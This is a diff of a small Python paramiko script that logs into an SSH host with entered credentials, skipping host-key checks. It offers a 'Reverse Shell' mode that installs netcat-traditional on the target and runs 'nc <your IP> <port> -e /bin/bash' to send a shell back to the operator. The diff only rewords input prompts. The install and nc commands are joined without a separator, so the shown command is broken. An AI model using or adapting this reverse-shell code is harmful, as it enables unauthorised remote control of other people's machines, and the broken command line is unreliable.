@@ -2,9 +2,9 @@ import paramiko
 import threading   
 
 
-host = input('Enter host: ')
-user = input('Enter username: ')
-passwd = input('Enter password: ')
+host = input('Enter the host you wanto connect: ')
+user = input('Enter the username: ')
+passwd = input('Enter thepassword: ')
 
 c = paramiko.SSHClient()
 c.set_missing_host_key_policy(paramiko.AutoAddPolicy()) #Conecta em conexões SSH sem verificar a chave do host
@@ -13,12 +13,12 @@ c.connect(host, username= user, password= passwd) #Passa os parâmetros para a c
 
 
 def exe_terminal(host=host):
-    urhost = input("Enter your host: ")
+    urhost = input("Enter your home's IP: ")
     print("Connected to the SSH server. You can now execute commands...\n")
     choose = input ("Choose one: [1] - Free Texting [2] - Reverse Shell: ")
     if choose == "2":
-        port = input("Enter the Port: ")
-        urhost = input("Enter your host: ")
+        port = input("Enter the Port that you wanna listen on: ")
+        urhost = input("Enter your home's IP: ")
         cmd = ("sudo apt update && sudo apt install netcat-traditional -y" + f"nc {urhost} {port} -e /bin/bash") #Comando para instalar o netcat-traditional e criar a conexão reversa
         stdin, stdout, stderr = c.exec_command(cmd)
         print(stdout.read().decode())
